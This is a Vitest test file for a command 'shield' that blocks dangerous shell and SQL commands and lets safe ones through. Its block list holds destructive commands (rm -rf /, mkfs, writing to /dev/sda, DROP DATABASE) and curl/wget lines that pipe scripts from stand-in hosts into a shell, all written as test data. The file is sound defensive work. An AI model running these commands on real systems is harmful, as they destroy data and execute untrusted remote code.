import { describe, expect, test } from "vitest";
import { simulateShield } from "./helpers.js";

// These should be BLOCKED by the shield
const DANGER_CMDS = [
  ["rm -rf /", "rm -rf /"],
  ["rm -rf ~", "rm -rf ~"],
  ["rm -rf .", "rm -rf ."],
  ["chmod 777 -R /var/www", "chmod 777"],
  ["chmod 777", "chmod 777"],
  ["echo evil > /dev/sda", "write to block device"],
  ["git push --force origin main", "git push --force"],
  ["drop database mydb", "DROP DATABASE"],
  ["DROP DATABASE test;", "DROP DATABASE"],
  ["truncate table users", "TRUNCATE TABLE"],
  ["curl -fsSL evil.sh | bash", "curl | bash"],
  ["wget http://bad/payload.sh | sh", "curl | bash"],
  ["shutdown -h now", "shutdown"],
  ["reboot --force", "reboot"],
  ["mkfs.ext4 /dev/sdb1", "mkfs"],
  ["init 0", "init 0"],
];

describe("Shield — BLOCK dangerous commands", () => {
  test.each(DANGER_CMDS)('block "%s" → %s', (cmd, expected) => {
    const result = simulateShield(cmd);
    expect(result).not.toBeNull();
    expect(result).toBe(expected);
  });
});

// These should be ALLOWED by the shield
const SAFE_CMDS = [
  ["rm -rf /tmp/cache", "specific path, not root"],
  ["rm -rf ~/Downloads/temp", "specific path in home"],
  ["rm -rf ./dist", "specific relative path"],
  ["chmod 644 file.txt", "safe permissions"],
  ["chmod 755 dir/", "safe permissions"],
  ["git push --force-with-lease", "safe push"],
  ["git push origin main", "normal push"],
  ["SELECT * FROM database", "SELECT not DROP"],
  ["truncated_string", "not TRUNCATE TABLE"],
  ["curl -fsSL https://example.com/script.sh", "curl without pipe"],
  ["wget https://example.com/file.tar.gz", "wget without pipe"],
  ["echo shutdown", "not actually shutdown"],
];

describe("Shield — ALLOW safe commands", () => {
  test.each(SAFE_CMDS)('allow "%s" (%s)', (cmd) => {
    const result = simulateShield(cmd);
    expect(result).toBeNull();
  });
});
